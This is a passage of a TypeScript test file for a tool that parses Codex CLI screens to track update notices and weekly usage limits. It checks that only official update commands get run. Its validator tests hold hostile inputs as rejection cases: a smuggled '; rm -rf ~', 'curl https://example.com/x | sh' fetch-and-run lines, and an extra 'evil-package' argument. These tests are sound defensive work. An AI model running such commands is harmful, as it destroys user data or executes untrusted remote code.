// Codex notices: detection from the screen and Codex's files (fictional
// values), validation of the update command, and the update job with a fake
// machine (the real installer never runs here).
import { describe, expect, it, vi } from 'vitest'
import {
  CODEX_STANDALONE_COMMAND, type KnownWeek, codexUpdateState, codexWeekWindow, codexWeeklyWarning, knownUpdateCommand, loadKnownWeeks,
  parseCliVersion, parseCodexScreen, parsePackageVersion, parseResetTime, parseVersionFile, rememberWeek, rolloutCliVersion, runningVersion,
  tuiVersion, updateScript, weekFromScreen,
} from '../shared/codexStatus'
import { type CodexMachine, createCodexStatus } from '../server/utils/codexStatus'
import type { MachineFs } from '../server/utils/fsx'
import type { Pane } from '../shared/types'

const SCREEN = `╭─────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ ✨ Update available! 0.159.1 -> 0.160.0                                                             │
│ Run sh -c 'curl -fsSL https://chatgpt.com/codex/install.sh | CODEX_NON_INTERACTIVE=1 sh' to update. │
│                                                                                                     │
│ See full release notes:                                                                             │
│ https://github.com/openai/codex/releases/latest                                                     │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────╯

› hello

• Hello!

⚠ Heads up, you have less than 25% of your weekly limit left. Run /status for a breakdown.

                                                                    ⚠ weekly limit: 12% left · /status
› Ask Codex to do anything

  gpt-5.5 medium · ~/tests                                                   ⚠ 1 warning · f2 to view
`

// Real situation (fictional values): the TUI runs 0.159.1 while the shared
// app-server daemon writes `cli_version` 0.160.0 into the rollout; the startup
// heads-up predates an early weekly reset that `/status` shows.
const STATUS_SCREEN = `╭──────────────────────────────────────────────────────────────────────╮
│ ✨ Update available! 0.159.1 -> 0.160.0                              │
│ Run sh -c 'curl -fsSL https://chatgpt.com/codex/install.sh | CODEX_NON_INTERACTIVE=1 sh' to │
│ update.                                                              │
╰──────────────────────────────────────────────────────────────────────╯
  >_ OpenAI Codex (v0.159.1)
     ~/demo
⚠ Heads up, you have less than 25% of your weekly limit left. Run /status for a breakdown.
› hello
• Hello!
/status
  >_ OpenAI Codex (v0.159.1)
  Server:              Local background server
  5h limit:            [████████████████████] 100% left (resets 15:33)
  Weekly limit:        [████████████████████] 100% left (resets 10:33 on 10 Oct)
› Ask Codex to do anything
`

// A low-quota /status card and the live footer can show different readings.
const LOW_STATUS_SCREEN = `  >_ OpenAI Codex (v0.159.1)
⚠ Heads up, you have less than 25% of your weekly limit left. Run /status for a breakdown.
› /status
╭──────────────────────────────────────────────────────────────────────╮
│  >_ OpenAI Codex (v0.159.1)                                           │
│  Model:               gpt-5.5 (reasoning medium)                       │
│  Directory:           ~/demo                                         │
│  5h limit:            [████████████████░░░░] 80% left (resets 15:33)   │
│  Weekly limit:        [██░░░░░░░░░░░░░░░░░░] 12% left (resets 10:33 on 10 Oct) │
╰──────────────────────────────────────────────────────────────────────╯

                                      ⚠ weekly limit: 11% left · /status
› Ask Codex to do anything

  gpt-5.5 medium · ~/demo                  ⚠ 1 warning · f2 to view
`

describe('parseCodexScreen', () => {
  it('reads the update box, its command and the weekly gauge', () => {
    expect(parseCodexScreen(SCREEN)).toEqual({
      update: { current: '0.159.1', latest: '0.160.0' },
      command: CODEX_STANDALONE_COMMAND,
      weekly: { left: 12, exact: true },
    })
  })

  it('joins a command wrapped over several lines', () => {
    const s = `│ ✨ Update available! 1.2.3 -> 1.3.0 │
│ Run sh -c 'curl -fsSL https://chatgpt.com/codex/install.sh | │
│ CODEX_NON_INTERACTIVE=1 sh' to update. │`
    expect(parseCodexScreen(s).command).toBe(CODEX_STANDALONE_COMMAND)
  })

  it('uses the heads-up message when the gauge is not shown', () => {
    expect(parseCodexScreen('⚠ Heads up, you have less than 25% of your weekly limit left. Run /status for a breakdown.')).toEqual({ weekly: { left: 25, exact: false } })
  })

  it('does not take "Run /status" for an update command', () => {
    expect(parseCodexScreen('⚠ Heads up, you have less than 10% of your weekly limit left. Run /status for a breakdown.').command).toBeUndefined()
  })

  it('finds nothing on an ordinary screen', () => {
    expect(parseCodexScreen('› Ask Codex to do anything\n  gpt-5.5 medium · ~/demo')).toEqual({})
    expect(parseCodexScreen(null)).toEqual({})
  })

  it('reads the TUI version and the /status weekly line with its reset', () => {
    expect(parseCodexScreen(STATUS_SCREEN)).toEqual({
      version: '0.159.1',
      update: { current: '0.159.1', latest: '0.160.0' },
      command: CODEX_STANDALONE_COMMAND,
      weekly: { left: 100, exact: true, resets: '10:33 on 10 Oct' },
    })
  })

  it('keeps the last TUI header (the pane restarted Codex)', () => {
    expect(parseCodexScreen('>_ OpenAI Codex (v0.158.0)\n…\n>_ OpenAI Codex (v0.160.0)').version).toBe('0.160.0')
  })

  it('keeps the complete /status reading when the footer also shows a warning', () => {
    const weekly = parseCodexScreen(LOW_STATUS_SCREEN).weekly
    expect(weekly).toEqual({ left: 12, exact: true, resets: '10:33 on 10 Oct' })
    const now = new Date(2026, 9, 3, 10, 37).getTime()
    expect(weekFromScreen(weekly, now)).toEqual({
      used: 88, resetsAt: new Date(2026, 9, 10, 10, 33).getTime(), at: now, source: 'screen', account: null,
    })
    expect(codexWeeklyWarning(LOW_STATUS_SCREEN)).toEqual({ left: 11, lessThan: false })
  })

  it('keeps the latest complete card, including when it follows a footer gauge', () => {
    const next = 'Weekly limit: [█░░░░] 9% left (resets 11:00 on 11 Oct)'
    expect(parseCodexScreen(`${LOW_STATUS_SCREEN}\n${next}\n⚠ weekly limit: 8% left · /status`).weekly)
      .toEqual({ left: 9, exact: true, resets: '11:00 on 11 Oct' })
    expect(parseCodexScreen(`⚠ weekly limit: 11% left · /status\n${next}`).weekly)
      .toEqual({ left: 9, exact: true, resets: '11:00 on 11 Oct' })
  })

  it('still reads the latest footer alone without inventing a reset', () => {
    const weekly = parseCodexScreen('⚠ weekly limit: 12% left · /status\n⚠ weekly limit: 11% left · /status').weekly
    expect(weekly).toEqual({ left: 11, exact: true })
    expect(weekFromScreen(weekly, new Date(2026, 9, 3).getTime())).toBeNull()
  })
})

describe('knownUpdateCommand', () => {
  it('accepts the official commands, spacing aside', () => {
    expect(knownUpdateCommand(`  sh -c 'curl  -fsSL https://chatgpt.com/codex/install.sh | CODEX_NON_INTERACTIVE=1 sh' `)).toBe(CODEX_STANDALONE_COMMAND)
    expect(knownUpdateCommand('npm install -g @openai/codex')).toBe('npm install -g @openai/codex')
    expect(knownUpdateCommand('brew upgrade --cask codex')).toBe('brew upgrade --cask codex')
  })

  it('refuses any other URL, argument or chained command', () => {
    expect(knownUpdateCommand(`sh -c 'curl -fsSL https://example.com/codex/install.sh | CODEX_NON_INTERACTIVE=1 sh'`)).toBeNull()
    expect(knownUpdateCommand(`${CODEX_STANDALONE_COMMAND}; rm -rf ~`)).toBeNull()
    expect(knownUpdateCommand('npm install -g @openai/codex evil-package')).toBeNull()
    expect(knownUpdateCommand('npm install -g @openai/codex && touch x')).toBeNull()
    expect(knownUpdateCommand('')).toBeNull()
  })

  it('builds a script only from a known command', () => {
    const s = updateScript(CODEX_STANDALONE_COMMAND)
    expect(s).toContain(CODEX_STANDALONE_COMMAND)
    expect(s).toContain('codex --version')
    expect(() => updateScript('curl https://example.com/x | sh')).toThrow()
  })
})

describe("Codex's files", () => {
  it('reads version.json', () => {
    expect(parseVersionFile('{"latest_version":"0.160.0","last_checked_at":"2026-01-01T00:00:00Z","dismissed_version":null}')).toEqual({ latest: '0.160.0', dismissed: null })
    expect(parseVersionFile('not json')).toEqual({ latest: null, dismissed: null })
  })

  it('reads a standalone package and a rollout header', () => {
    expect(parsePackageVersion('{"layoutVersion":1,"version":"0.159.1","target":"x"}')).toBe('0.159.1')
    expect(rolloutCliVersion('{"timestamp":"2026-01-01T00:00:00Z","type":"session_meta","payload":{"id":"abc","cli_version":"0.159.1"}}\n{"x":1}')).toBe('0.159.1')
    expect(rolloutCliVersion('{"type":"event_msg"}')).toBeNull()
    expect(parseCliVersion('codex-cli 0.160.0\n')).toBe('0.160.0')
  })
})

describe('runningVersion', () => {
  it('trusts the TUI header over the rollout (written by the shared daemon)', () => {
    expect(runningVersion({ rollout: '0.160.0', screen: { version: '0.159.1' } })).toBe('0.159.1')
    expect(runningVersion({ rollout: '0.160.0', screen: { update: { current: '0.159.1', latest: '0.160.0' } } })).toBe('0.159.1')
    expect(runningVersion({ rollout: '0.158.0', screen: {} })).toBe('0.158.0')
    expect(runningVersion({ rollout: null, screen: {} })).toBeNull()
  })
})

describe('tuiVersion', () => {
  it('is the TUI\'s own word, never the rollout\'s', () => {
    expect(tuiVersion({ version: '0.160.0', update: { current: '0.159.1', latest: '0.160.0' } }, '0.158.0')).toBe('0.160.0')
    expect(tuiVersion({ update: { current: '0.159.1', latest: '0.160.0' } })).toBe('0.159.1')
    expect(tuiVersion({}, '0.159.1')).toBe('0.159.1')
    expect(tuiVersion({})).toBeNull()
  })
})

describe('codexUpdateState', () => {
  const base = { running: '0.159.1', latest: '0.160.0', installed: '0.159.1', standalone: true, screen: {}, canRun: true }

  it('offers the standalone command when a newer version is out', () => {
    expect(codexUpdateState(base)).toMatchObject({ state: 'available', latest: '0.160.0', current: '0.159.1', command: CODEX_STANDALONE_COMMAND, runnable: true })
  })

  it('types it into the agent terminal when the server cannot run it', () => {
    expect(codexUpdateState(base)).toMatchObject({ method: 'direct' })
    expect(codexUpdateState({ ...base, canRun: false })).toMatchObject({ runnable: true, method: 'terminal', command: CODEX_STANDALONE_COMMAND })
  })

  it('shows an unknown screen command to copy, never to run', () => {
    const u = codexUpdateState({ ...base, standalone: false, installed: null, screen: { command: 'curl https://example.com/i.sh | sh' } })
    expect(u).toMatchObject({ runnable: false, command: 'curl https://example.com/i.sh | sh' })
  })

  it('runs a known screen command (npm install)', () => {
    const u = codexUpdateState({ ...base, standalone: false, installed: null, screen: { command: 'npm install -g @openai/codex' } })
    expect(u).toMatchObject({ runnable: true, command: 'npm install -g @openai/codex' })
  })

  it('offers a restart once installed', () => {
    expect(codexUpdateState({ ...base, tui: '0.159.1', installed: '0.160.0' })).toMatchObject({ state: 'installed', latest: '0.160.0', current: '0.159.1' })
    expect(codexUpdateState({ ...base, tui: '0.159.1', job: { phase: 'done', version: '0.160.0', at: 1 } })).toMatchObject({ state: 'installed' })
  })

  it('regression: no restart asked on the rollout\'s word alone (daemon or resumed conversation)', () => {
    // 0.160.0 installed and run by the TUI, whose header scrolled away; the
    // rollout's first line was written by 0.159.1.
    const up = { ...base, running: '0.159.1', installed: '0.160.0', latest: '0.160.0' }
    expect(codexUpdateState({ ...up, tui: null })).toBeNull()
    expect(codexUpdateState(up)).toBeNull()
    // The TUI says it runs the installed version: nothing either.
    expect(codexUpdateState({ ...up, running: '0.160.0', tui: '0.160.0' })).toBeNull()
    // The TUI says it runs an older one: restart.
    expect(codexUpdateState({ ...up, tui: '0.159.1' })).toMatchObject({ state: 'installed', latest: '0.160.0', current: '0.159.1' })
  })

  it('offers the update to an agent started after the install of an older version', () => {
    // Regression: 0.159.1 installed and running, 0.160.0 out (version.json).
    const running = runningVersion({ rollout: '0.160.0', screen: parseCodexScreen(STATUS_SCREEN) })
    expect(codexUpdateState({ ...base, running })).toMatchObject({ state: 'available', latest: '0.160.0', current: '0.159.1' })
  })

  it('says nothing when up to date or dismissed in Codex', () => {
    expect(codexUpdateState({ ...base, latest: '0.159.1' })).toBeNull()
    expect(codexUpdateState({ ...base, dismissed: '0.160.0' })).toBeNull()
    expect(codexUpdateState({ ...base, running: null, installed: null, latest: null })).toBeNull()
  })
})

describe('parseResetTime', () => {
  const now = new Date(2026, 9, 3, 10, 37).getTime()
  it('reads the /status reset formats', () => {
    expect(parseResetTime('10:33 on 10 Oct', now)).toBe(new Date(2026, 9, 10, 10, 33).getTime())
    expect(parseResetTime('3:46 PM on Oct 4', now)).toBe(new Date(2026, 9, 4, 15, 46).getTime())
    expect(parseResetTime('15:33', now)).toBe(new Date(2026, 9, 3, 15, 33).getTime())
    expect(parseResetTime('09:00', now)).toBe(new Date(2026, 9, 4, 9, 0).getTime())
    expect(parseResetTime('10:00 on 2 Jan', new Date(2026, 11, 30).getTime())).toBe(new Date(2027, 0, 2, 10, 0).getTime())
    expect(parseResetTime('soon', now)).toBeNull()
  })
})

describe('codexWeeklyWarning (mirrors the screen)', () => {
  it("copies the footer gauge's value verbatim", () => {
    expect(codexWeeklyWarning(SCREEN)).toEqual({ left: 12, lessThan: false })
    expect(codexWeeklyWarning('› Ask Codex to do anything\n\n   ⚠ weekly limit: 3% left · /status\n  gpt-5.5 medium · ~/demo')).toEqual({ left: 3, lessThan: false })
  })
  it('copies the heads-up bound verbatim when no gauge is shown', () => {
    const s = `  >_ OpenAI Codex (v0.159.1)
⚠ Heads up, you have less than 10% of your weekly limit left. Run /status for a breakdown.
› Ask Codex to do anything`
    expect(codexWeeklyWarning(s)).toEqual({ left: 10, lessThan: true })
  })
  it('nothing on screen: no warning, whatever was shown before', () => {
    expect(codexWeeklyWarning('› Ask Codex to do anything\n  gpt-5.5 medium · ~/demo')).toBeNull()
    expect(codexWeeklyWarning('')).toBeNull()
    expect(codexWeeklyWarning(null)).toBeNull()
  })
  it('regression: a heads-up from before a restart or a /status is not current', () => {
    // Heads-up printed at the previous start, then Codex restarted (new header).
    const restarted = `⚠ Heads up, you have less than 25% of your weekly limit left. Run /status for a breakdown.
› hello
  >_ OpenAI Codex (v0.160.0)
› Ask Codex to do anything`
    expect(codexWeeklyWarning(restarted)).toBeNull()
    // /status after the heads-up shows the up-to-date usage (100 % left).
    expect(codexWeeklyWarning(STATUS_SCREEN)).toBeNull()
  })
  it("a /status card's bar is a reading, not a warning", () => {
    expect(codexWeeklyWarning(`/status
  Weekly limit:        [██░░░░░░░░░░░░░░░░░░] 12% left (resets 10:33 on 10 Oct)
› Ask Codex to do anything`)).toBeNull()
  })
  it('a gauge text far above the footer (scrollback) is not the footer', () => {
    const lines = ['• weekly limit: 12% left', ...Array.from({ length: 10 }, (_, i) => `• line ${i}`), '› Ask Codex to do anything']
    expect(codexWeeklyWarning(lines.join('\n'))).toBeNull()
  })
})

describe('codexWeekWindow (home gauge)', () => {
  const now = new Date(2026, 9, 3, 10, 37).getTime()
  const H = 3600000
  const old = { used: 88, resetsAt: now + 17 * H, at: now - 10 * H }
  it('gives the current window whatever is left', () => {
    expect(codexWeekWindow({ week: { ...old, used: 40 }, now })).toEqual({ left: 60, resetsAt: old.resetsAt, source: 'rollout' })
  })
  it('regression: /status after an early reset wins, with its reset time', () => {
    const screen = parseCodexScreen(STATUS_SCREEN).weekly
    expect(codexWeekWindow({ week: old, screen, now })).toEqual({ left: 100, resetsAt: new Date(2026, 9, 10, 10, 33).getTime(), source: 'screen' })
  })
  it('an expired window is not current', () => {
    expect(codexWeekWindow({ week: { ...old, resetsAt: now - 1 }, now })).toBeNull()
  })
})

describe('known weekly window (survives restarts)', () => {
  const now = new Date(2026, 9, 3, 10, 37).getTime()
  const H = 3600000
  // Stale rollout: 12 % left, its window resets tomorrow at 03:46 (still to come).
  const stale = { account: 'aaaaaaaaaaaaaaaa', used: 88, resetsAt: new Date(2026, 9, 4, 3, 46).getTime(), at: now - 10 * H }
  // `/status` read before Codex restarted: early reset, 100 % left until 10 Oct.
  const fresh: KnownWeek = { account: 'aaaaaaaaaaaaaaaa', used: 0, resetsAt: new Date(2026, 9, 10, 10, 33).getTime(), at: now - H, source: 'screen' }

  it('regression: stale rollout + remembered /status window: the gauge stays full after the restart', () => {
    expect(codexWeekWindow({ week: stale, known: fresh, now })).toEqual({ left: 100, resetsAt: fresh.resetsAt, source: 'screen' })
  })
  it('a genuinely new low reading in the known window is kept', () => {
    const low = { account: 'aaaaaaaaaaaaaaaa', used: 81, resetsAt: fresh.resetsAt + 2 * 60000, at: now }
    expect(codexWeekWindow({ week: low, known: fresh, now })).toEqual({ left: 19, resetsAt: low.resetsAt, source: 'rollout' })
    // Same window remembered with more usage than the rollout: the higher usage.
    expect(codexWeekWindow({ week: { ...low, used: 40 }, known: { ...fresh, used: 85 }, now })).toMatchObject({ left: 15, source: 'rollout' })
  })
  it('a later structured window beats an older remembered one', () => {
    const next = { used: 90, resetsAt: fresh.resetsAt + 7 * 24 * H, at: now }
    expect(codexWeekWindow({ week: next, known: fresh, now })).toMatchObject({ left: 10, source: 'rollout' })
  })
  it("ignores another account's window and an expired one", () => {
    expect(codexWeekWindow({ week: { ...stale, account: 'aaaa' }, known: { ...fresh, account: 'bbbb' }, now })).toMatchObject({ left: 12 })
    expect(codexWeekWindow({ week: stale, known: { ...fresh, resetsAt: now - 1 }, now })).toMatchObject({ left: 12 })
    expect(codexWeekWindow({ week: stale, known: { ...fresh, account: 'aaaa' }, now })).toMatchObject({ left: 12 })
    expect(codexWeekWindow({ week: { ...stale, account: 'aaaa' }, known: fresh, now })).toMatchObject({ left: 12 })
  })

  it.each([null, undefined, ''])('does not carry weekly usage between unidentified accounts (%s)', (account) => {
    const previous: KnownWeek = { used: 90, resetsAt: fresh.resetsAt, at: now - 60000, source: 'rollout', account }
    const current: KnownWeek = { used: 8, resetsAt: fresh.resetsAt, at: now, source: 'rollout', account }
    expect(rememberWeek(previous, current, now)).toEqual(current)
    expect(rememberWeek(previous, null, now)).toBeNull()
    for (const resetsAt of [fresh.resetsAt, fresh.resetsAt + H]) {
      expect(codexWeekWindow({ week: current, known: { ...previous, resetsAt }, now })).toMatchObject({ left: 92, source: 'rollout' })
    }
  })

  it('rememberWeek keeps the latest window, and the higher usage within it', () => {
    const old = { ...stale, source: 'rollout' as const }
    expect(rememberWeek(null, old, now)).toEqual(old)
    expect(rememberWeek(old, fresh, now)).toEqual(fresh)
    expect(rememberWeek(fresh, old, now)).toEqual(fresh) // stale even though its reset is to come
    const later = { ...fresh, used: 7, resetsAt: fresh.resetsAt + 60000, at: now, source: 'rollout' as const }
    expect(rememberWeek(fresh, later, now)).toMatchObject({ used: 7, resetsAt: later.resetsAt, at: now })
    expect(rememberWeek(later, { ...fresh, at: now + 1 }, now)).toMatchObject({ used: 7, at: now + 1 })
    expect(rememberWeek({ ...fresh, resetsAt: now - 1 }, null, now)).toBeNull()
    expect(rememberWeek(fresh, { ...old, account: 'bbbb' }, now)).toEqual({ ...old, account: 'bbbb' })
    expect(rememberWeek({ ...fresh, account: 'aaaa' }, old, now)).toEqual(old)
    expect(rememberWeek({ ...fresh, account: 'aaaa' }, { ...old, account: 'bbbb' }, now)).toMatchObject({ account: 'bbbb', used: 88 })
  })
  it('weekFromScreen: dated /status gauges only, no stale bare time', () => {
    expect(weekFromScreen({ left: 100, exact: true, resets: '10:33 on 10 Oct' }, now)).toEqual({ ...fresh, at: now, account: null })
    expect(weekFromScreen({ left: 12, exact: true }, now)).toBeNull()
    expect(weekFromScreen({ left: 20, exact: false }, now)).toBeNull()
    expect(weekFromScreen({ left: 50, exact: true, resets: '15:00' }, now)).toMatchObject({ used: 50, resetsAt: new Date(2026, 9, 3, 15, 0).getTime() })
    // "03:46" read at 10:37: an old /status still in the scrollback.
    expect(weekFromScreen({ left: 12, exact: true, resets: '03:46' }, now)).toBeNull()
  })
  it('loadKnownWeeks keeps well-formed, running windows', () => {
    const raw = { a: fresh, b: { ...fresh, resetsAt: now - 1 }, c: { used: 'x' }, d: null, e: { ...fresh, source: 'other' } }
    expect(loadKnownWeeks(raw, now)).toEqual([['a', fresh]])
    expect(loadKnownWeeks(null, now)).toEqual([])
    expect(loadKnownWeeks([fresh], now)).toEqual([])
  })
})

// ---------------------------------------------------------------- service
// `/status` after an early weekly reset, in the service's clock (1 Jan 2026).
const RESET_AT = new Date(2026, 0, 7, 10, 33).getTime()
const RESET_SCREEN = `  >_ OpenAI Codex (v0.159.1)
/status
  Weekly limit:        [████████████████████] 100% left (resets 10:33 on 7 Jan)
› Ask Codex to do anything
`
const HOME = '/home/demo'
const ROLLOUT = `${HOME}/.codex/sessions/2026/01/01/rollout-demo.jsonl`
function fakeFs(files: Record<string, string>): MachineFs {
  const get = (p: string) => {
    if (!(p in files)) throw Object.assign(new Error('ENOENT'), { code: 'ENOENT' })
    return files[p]!
  }
  return {
    stat: async p => ({ size: Buffer.byteLength(get(p)), mtimeMs: 1000, isFile: true, isDir: false }),
    statMany: async ps => ps.map(p => (p in files ? { size: files[p]!.length, mtimeMs: 1000, isFile: true, isDir: false } : null)),
    readdir: async () => [],
    readFile: async p => get(p),
    read: async (p, start, len) => Buffer.from(get(p)).subarray(start, start + len),
  }
}

function setup(o: {
  local?: boolean, writable?: boolean, exitCode?: number, hang?: boolean, screen?: string | Error, cliVersion?: string
  loadWeeks?: () => unknown, saveWeeks?: (w: Record<string, KnownWeek>) => void
  pid?: number | null | Error
} = {}) {
  const ts = '2026-01-01T10:00:00Z'
  const files = {
    [`${HOME}/.codex/version.json`]: '{"latest_version":"0.160.0","dismissed_version":null}',
    [`${HOME}/.codex/packages/standalone/current/codex-package.json`]: '{"version":"0.159.1"}',
    [ROLLOUT]: [
      `{"timestamp":"${ts}","type":"session_meta","payload":{"id":"demo","cli_version":"${o.cliVersion ?? '0.159.1'}"}}`,
      `{"timestamp":"${ts}","type":"event_msg","payload":{"type":"token_count","rate_limits":{"primary":{"used_percent":10,"window_minutes":300,"resets_at":${Date.parse(ts) / 1000 + 3600}},"secondary":{"used_percent":90,"window_minutes":10080,"resets_at":${Date.parse(ts) / 1000 + 86400}}}}}`,
      '',
    ].join('\n'),
  }
  const exec = vi.fn(async (_script: string, _input: Buffer, _t: number) => o.hang ? new Promise<never>(() => {}) : ({ code: o.exitCode ?? 0, stdout: Buffer.from('installed\ncodex-cli 0.160.0\n'), stderr: o.exitCode ? 'curl: (6) Could not resolve host' : '' }))
  const log = vi.fn()
  const runLocal = vi.fn(async () => ({ code: 0, stdout: Buffer.from('codex-cli 0.160.0\n'), stderr: '' }))
  const m: CodexMachine = { key: 'mac', label: 'Laptop', local: Boolean(o.local), home: HOME, fs: fakeFs(files), online: true, exec: o.local ? null : exec }
  let clock = Date.parse(ts)
  const svc = createCodexStatus({
    machineOf: () => m,
    readScreen: async () => {
      if (o.screen instanceof Error) throw o.screen
      return o.screen ?? SCREEN
    },
    rolloutOf: async () => ROLLOUT,
    agentPid: async () => {
      if (o.pid instanceof Error) throw o.pid
      return o.pid ?? null
    },
    runLocal,
    writable: async () => Boolean(o.writable),
    onChange: () => {},
    log,
    now: () => clock,
    loadWeeks: o.loadWeeks,
    saveWeeks: o.saveWeeks,
  })
  const pane = { id: 'w1:p1', agent: 'codex', status: 'idle', bornAt: 500 } as Pane
  return { svc, pane, exec, runLocal, log, files, tick: (ms: number) => { clock += ms } }
}

describe('Codex status service', () => {
  it('combines files, rollout and screen', async () => {
    const { svc, pane } = setup()
    const st = await svc.compute(pane)
    expect(st?.update).toMatchObject({ state: 'available', latest: '0.160.0', current: '0.159.1', runnable: true })
    // The screen's 12 %, not the rollout's 10 %.
    expect(st?.weekly).toEqual({ left: 12, lessThan: false })
  })

  it('regression: banner for a 0.159.1 TUI behind a 0.160.0 daemon, no stale weekly alert', async () => {
    const { svc, pane, log } = setup({ screen: STATUS_SCREEN, cliVersion: '0.160.0' })
    const st = await svc.compute(pane)
    expect(st?.update).toMatchObject({ state: 'available', latest: '0.160.0', current: '0.159.1' })
    expect(st?.weekly).toBeUndefined()
    expect(log).toHaveBeenCalledOnce()
    expect(log.mock.calls[0]![0]).toMatch(/running=0\.159\.1 \(screen 0\.159\.1, rollout 0\.160\.0\).*-> available.*-> no weekly warning on screen/)
    await svc.compute(pane)
    expect(log).toHaveBeenCalledOnce() // only logged when the decision changes
  })

  // Real situation (fictional values): Codex 0.160.0 installed and running,
  // its header scrolled off the screen; the rollout's first line was written
  // by 0.159.1 (shared daemon, or a conversation resumed after the update).
  const LATER_SCREEN = `• Done: the tests pass.

› Ask Codex to do anything

  gpt-5.5 medium · ~/demo
`
  const header = (v: string) => `  >_ OpenAI Codex (v${v})\n     ~/demo\n${LATER_SCREEN}`
  const installed = (files: Record<string, string>, v: string) => {
    files[`${HOME}/.codex/packages/standalone/current/codex-package.json`] = `{"version":"${v}"}`
    files[`${HOME}/.codex/version.json`] = `{"latest_version":"${v}","dismissed_version":null}`
  }

  it('regression: no restart asked of a Codex already on the installed version', async () => {
    const o = { screen: LATER_SCREEN, cliVersion: '0.159.1', pid: 42 as number | null }
    const { svc, pane, files, log } = setup(o)
    installed(files, '0.160.0')
    expect((await svc.compute(pane))?.update).toBeUndefined()
    expect(log.mock.calls[0]![0]).toMatch(/rollout 0\.159\.1\).*installed=0\.160\.0.*-> no update/)
    // Header on screen: same answer.
    o.screen = header('0.160.0')
    expect((await svc.compute(pane))?.update).toBeUndefined()
  })

  it('asks for a restart while the old Codex runs, not once it runs the new one', async () => {
    const o = { screen: header('0.159.1'), cliVersion: '0.159.1', pid: 42 as number | null }
    const { svc, pane, files, tick } = setup(o)
    installed(files, '0.159.1')
    expect((await svc.compute(pane))?.update).toBeUndefined()
    // 0.160.0 installed during the session (elsewhere than wherdr).
    installed(files, '0.160.0')
    tick(61000)
    expect((await svc.compute(pane))?.update).toMatchObject({ state: 'installed', latest: '0.160.0', current: '0.159.1' })
    // Its header scrolls away: still the same process, still the old version.
    o.screen = LATER_SCREEN
    expect((await svc.compute(pane))?.update).toMatchObject({ state: 'installed', current: '0.159.1' })
    // Restarted on 0.160.0 (new process): the notice is gone, header shown or not.
    o.pid = 43
    expect((await svc.compute(pane))?.update).toBeUndefined()
    o.screen = header('0.160.0')
    expect((await svc.compute(pane))?.update).toBeUndefined()
    o.screen = LATER_SCREEN
    expect((await svc.compute(pane))?.update).toBeUndefined()
  })

  it('unknown version or failed detection: no restart asked', async () => {
    for (const pid of [null, new Error('pane gone')]) {
      const o = { screen: header('0.159.1') as string | Error, cliVersion: '0.159.1', pid }
      const { svc, pane, files } = setup(o)
      installed(files, '0.160.0')
      expect((await svc.compute(pane))?.update).toMatchObject({ state: 'installed' })
      // Header gone and process unknown: nothing remembered, nothing claimed.
      o.screen = LATER_SCREEN
      expect((await svc.compute(pane))?.update).toBeUndefined()
      o.screen = new Error('invalid request')
      expect((await svc.compute(pane))?.update).toBeUndefined()
    }
    // No screen, no rollout version.
    const o = { screen: new Error('invalid request') as string | Error, pid: 42 }
    const { svc, pane, files } = setup(o)
    files[ROLLOUT] = '{"type":"event_msg"}\n'
    installed(files, '0.160.0')
    expect((await svc.compute(pane))?.update).toBeUndefined()
  })

  it('logs why the screen could not be read', async () => {
    const { svc, pane, log } = setup({ screen: new Error('invalid request'), cliVersion: '0.160.0' })
    expect((await svc.compute(pane))?.update).toBeUndefined()
    expect(log.mock.calls[0]![0]).toMatch(/screen unreadable: invalid request, rollout 0\.160\.0/)
  })

  it('runs the known command over SSH, then offers the restart', async () => {
    const { svc, pane, exec } = setup()
    await svc.startUpdate(pane)
    await vi.waitFor(() => expect(exec).toHaveBeenCalledOnce())
    const [script, input] = exec.mock.calls[0]!
    expect(script).toBe('exec sh -s')
    expect(input.toString()).toContain(CODEX_STANDALONE_COMMAND)
    await vi.waitFor(async () => expect((await svc.compute(pane))?.update).toMatchObject({ state: 'installed', latest: '0.160.0' }))
  })

  it('reports a failure with its last error line', async () => {
    const { svc, pane } = setup({ exitCode: 1 })
    await svc.startUpdate(pane)
    await vi.waitFor(async () => expect((await svc.compute(pane))?.update?.job).toEqual({ phase: 'failed', error: 'curl: (6) Could not resolve host' }))
  })

  it('read-only home: never runs locally, types it into the agent pane', async () => {
    const { svc, pane, runLocal } = setup({ local: true, writable: false })
    expect((await svc.compute(pane))?.update).toMatchObject({ runnable: true, method: 'terminal', command: CODEX_STANDALONE_COMMAND })
    await expect(svc.startUpdate(pane)).rejects.toThrow(/cannot be run/)
    let finish!: () => void
    const inPane = vi.fn(async () => ({ done: new Promise<void>((r) => { finish = r }) }))
    expect(await svc.startUpdate(pane, inPane)).toEqual({ command: CODEX_STANDALONE_COMMAND, method: 'terminal' })
    expect(inPane).toHaveBeenCalledWith(CODEX_STANDALONE_COMMAND)
    expect(runLocal).not.toHaveBeenCalled()
    // Other Codex of the machine see it running; a second one is refused.
    await expect(svc.startUpdate(pane, inPane)).rejects.toThrow(/already in progress/)
    finish()
    await vi.waitFor(async () => expect(await svc.startUpdate(pane, inPane)).toMatchObject({ method: 'terminal' }))
  })

  it('a refusal from the pane (agent busy) starts nothing', async () => {
    const { svc, pane } = setup({ local: true, writable: false })
    const inPane = vi.fn(async () => { throw new Error('Codex is working or waiting for an answer') })
    await expect(svc.startUpdate(pane, inPane)).rejects.toThrow(/working/)
    await expect(svc.startUpdate(pane, inPane)).rejects.toThrow(/working/) // not "already in progress"
  })

  it('reads every Codex screen of the machine for the home gauge', async () => {
    const saved: Record<string, KnownWeek>[] = []
    const o = { screen: RESET_SCREEN as string, saveWeeks: (w: Record<string, KnownWeek>) => { saved.push(w) } }
    const { svc, pane, tick } = setup(o)
    const other = { id: 'w1:p2', agent: 'claude', status: 'idle' } as Pane
    expect(await svc.knownWeek('mac', [pane, other], { used: 90, resetsAt: Date.parse('2026-01-02T10:00:00Z'), at: Date.parse('2026-01-01T10:00:00Z'), account: 'aaaaaaaaaaaaaaaa' })).toMatchObject({ used: 0, resetsAt: RESET_AT, source: 'screen' })
    expect(await svc.knownWeek('pi', [pane])).toBeNull()
    // Screen gone (Codex restarted): the window stays known, a stale rollout does not undo it.
    o.screen = SCREEN
    tick(60000)
    const rolled = { account: 'aaaaaaaaaaaaaaaa', used: 90, resetsAt: Date.parse('2026-01-02T10:00:00Z'), at: Date.parse('2026-01-01T10:00:00Z') }
    expect(await svc.knownWeek('mac', [], rolled)).toMatchObject({ used: 0, resetsAt: RESET_AT })
    // Saved to data/ and read back after a wherdr restart.
    expect(saved.at(-1)).toEqual({ mac: expect.objectContaining({ used: 0, resetsAt: RESET_AT, source: 'screen' }) })
